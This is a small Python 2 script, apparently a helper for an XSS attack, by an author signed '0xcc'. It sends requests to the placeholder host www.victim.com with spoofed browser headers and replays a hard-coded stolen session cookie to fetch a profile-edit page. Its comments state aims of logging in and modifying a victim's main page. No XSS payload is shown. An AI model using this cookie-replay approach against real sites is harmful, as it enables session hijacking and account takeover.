#-*- coding:utf-8 -*-

#This is a Good Example for testing our XSS attack scripts here, using our 
#Python Scripts to launch the attack by simply HTTP get method.

import requests
import parseCookie
import Util
import logs
#Get Cookie 
#Login
#Modiy Author's MainPage.
#Log Down Attack trace.

#
#
# @author : 0xcc
#
#
#
#
#

proxies = {
    "http" : "http://127.0.0.1:8080"
    }

class LaunchRequest:
     
    #Normal Utility about headers
    
    def __init__(self,cookie):
        
        print "[*] Starting Initializing process.."
        
        self.cookie     = cookie
        self.headers    = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                           "User-Agent"         :"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
                           "connection"         :"keep-alive",
                           "Cache-Control"      :"max-age=0",
                           "Accept-Encoding"    :"gzip,deflate",
                           "Accept-Language"    :"en-USE,en;q=0.5",
                           "Host"               :"www.victim.com",
                           "Referer"            :"http://www.victim.com/Phomepage.html"
                           }
        
        
    def send(self,url , params, method, opencookie):
        
        if method is "post":
            
            if opencookie == 1:
                response = requests.post(url, data = params, headers = self.headers, cookies = self.cookie)
                return response.text
            
            else:
                response = requests.post(url, data = params, headers = self.headers)
                return response.text
                
        elif method is "get":
            
            if opencookie == 1:
                response = requests.get(url,headers = self.headers, cookies = self.cookie)
                return response.text
            
            else:
            #Get what we want from this request.
                response = requests.get(url,headers = self.headers)
                return response.text
            
if __name__ == '__main__':
    
    cookieStr = "CNZZDATA3458012=cnzz_eid%3D1068221846-1472627900-http%253A%252F%252Fwww.victim.com%252F%26ntime%3D1473149387; JSESSIONID=C6C32E31A810187A458CB2A2FE6B0639"
    cookies = parseCookie.parseCookie(cookieStr)
    Request = LaunchRequest(cookies)
    print Util.parsehtml.parse(Request.send("http://www.victim.com/editUserProfile.html", None, "get",1))
    
    
    
    